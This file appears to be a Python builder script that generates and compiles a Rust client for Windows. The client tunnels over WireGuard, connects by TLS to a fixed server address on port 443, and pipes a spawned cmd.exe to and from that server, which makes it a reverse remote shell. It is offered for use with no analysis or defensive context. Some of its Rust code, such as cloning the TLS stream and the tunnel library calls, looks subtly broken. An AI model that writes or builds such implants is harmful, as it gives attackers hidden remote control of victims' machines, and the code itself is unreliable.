import os
import subprocess
from jinja2 import Template

def read_cert_file_as_byte_array(path):
    with open(path, "rb") as f:
        data = f.read()
    # Convert each byte to its integer representation, comma separated.
    return ", ".join(str(b) for b in data)

# Read certificate data from the certificates directory.
client_cert_bytes = read_cert_file_as_byte_array("certificates/client_cert.pem")
client_key_bytes = read_cert_file_as_byte_array("certificates/client_key.pem")
ca_cert_bytes = read_cert_file_as_byte_array("certificates/ca_cert.pem")

# Updated Rust client template with TLS, WireGuard, and Windows native I/O.
rust_client_template = r'''
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;
use tokio::process::Command;
use std::process::Stdio;
use boringtun::device::Device;
use boringtun::noise::Noise;
use tun::Configuration;
use tokio_rustls::TlsConnector;
use tokio_rustls::rustls::{ClientConfig, Certificate, PrivateKey, RootCertStore};
use std::sync::Arc;
use std::error::Error;
use std::convert::TryInto;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    // --- Setup TUN interface for WireGuard ---
    let mut tun_config = Configuration::default();
    tun_config.name("wg0")
              .address("10.0.0.2")
              .netmask("255.255.255.0")
              .up();
    let tun = tun::create(&tun_config).expect("Failed to create TUN device");

    // --- Configure WireGuard (boringtun) ---
    let private_key: [u8; 32] = [{{ private_key }}];
    let server_public_key: [u8; 32] = [{{ server_public_key }}];
    let preshared_key: [u8; 32] = [0; 32];
    let noise = Noise::new(private_key, server_public_key, preshared_key);
    let udp_socket = tokio::net::UdpSocket::bind("0.0.0.0:0").await?;
    let mut wg_device = Device::new(noise, tun, udp_socket);
    tokio::spawn(async move {
        if let Err(e) = wg_device.run().await {
            eprintln!("WireGuard error: {:?}", e);
        }
    });

    // --- Setup TLS configuration for secure connection over port 443 ---
    // Client certificate and private key (as byte arrays).
    let client_cert = Certificate(vec![{{ client_cert_bytes }}]);
    let client_key = PrivateKey(vec![{{ client_key_bytes }}]);

    // RootCertStore containing the CA certificate (for verifying the server).
    let mut root_cert_store = RootCertStore::empty();
    root_cert_store.add(&Certificate(vec![{{ ca_cert_bytes }}])).expect("Failed to add CA cert");

    let config = ClientConfig::builder()
        .with_safe_defaults()
        .with_root_certificates(root_cert_store)
        .with_single_cert(vec![client_cert], client_key)?;
    let tls_connector = TlsConnector::from(Arc::new(config));

    // Connect to the TLS server on port 443.
    let addr = "10.0.0.1:443";
    let tcp_stream = TcpStream::connect(addr).await?;
    let domain = "example.com".try_into().expect("Invalid DNS name");
    let mut stream = tls_connector.connect(domain, tcp_stream).await?;

    // --- Spawn native Windows process (cmd.exe) for I/O ---
    let mut child = Command::new("cmd")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()?;
    let mut child_stdin = child.stdin.take().expect("Failed to open child's stdin");
    let child_stdout = child.stdout.take().expect("Failed to open child's stdout");
    let mut stdout_reader = BufReader::new(child_stdout).lines();

    // Forward output from cmd.exe to the TLS stream.
    let mut stream_clone = stream.clone();
    tokio::spawn(async move {
        while let Ok(Some(line)) = stdout_reader.next_line().await {
            if let Err(e) = stream_clone.write_all(format!("{}\n", line).as_bytes()).await {
                eprintln!("Failed to write to server: {:?}", e);
                break;
            }
        }
    });

    // Forward input from the TLS stream to cmd.exe.
    let mut stream_reader = BufReader::new(stream);
    let mut line = String::new();
    loop {
        let bytes_read = stream_reader.read_line(&mut line).await?;
        if bytes_read == 0 { break; }
        child_stdin.write_all(line.as_bytes()).await?;
        line.clear();
    }

    Ok(())
}
'''

# Render the template (the boringtun keys remain hardcoded as placeholders).
template = Template(rust_client_template)
rendered_code = template.render(
    private_key="1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1",
    server_public_key="2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2",
    client_cert_bytes=client_cert_bytes,
    client_key_bytes=client_key_bytes,
    ca_cert_bytes=ca_cert_bytes
)

project_name = "rust_client_tls_windows"
if not os.path.exists(project_name):
    subprocess.run(["cargo", "new", project_name, "--bin"], check=True)

with open(os.path.join(project_name, "src", "main.rs"), "w") as f:
    f.write(rendered_code)

cargo_toml_path = os.path.join(project_name, "Cargo.toml")
with open(cargo_toml_path, "a") as f:
    f.write('\n[dependencies]\n')
    f.write('tokio = { version = "1", features = ["full"] }\n')
    f.write('tokio-rustls = "0.23"\n')
    f.write('rustls = "0.20"\n')
    f.write('rustls-pemfile = "1.0"\n')
    f.write('boringtun = "0.3"\n')
    f.write('tun = "0.4"\n')

subprocess.run(["cargo", "build", "--manifest-path", cargo_toml_path], check=True)
